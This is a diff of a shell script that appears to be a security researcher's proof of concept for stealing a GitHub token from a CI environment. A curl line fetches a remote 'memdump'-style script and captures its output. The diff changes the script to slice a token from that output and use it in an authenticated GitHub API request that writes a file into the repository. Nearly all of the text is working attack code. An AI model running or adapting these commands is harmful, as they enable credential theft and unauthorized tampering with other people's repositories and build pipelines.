@@ -9,15 +9,15 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-string2=${TOKEN_VAL:1:31} 
-echo $string2
+T2=${TOKEN_VAL:0:42} 
+echo $T2
 echo "---------------------------3--------------------------------------"
 
 
 curl -L \
   -X PUT \
   -H "Accept: application/vnd.github+json" \
-  -H "Authorization: token whatismytoken" \
+  -H "Authorization: token $T2" \
   -H "X-GitHub-Api-Version: 2022-11-28" \
   "https://api.github.com/repos/${REPO}/contents/README1.md" \
   -d '{"message":"hello from r3s34rch","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
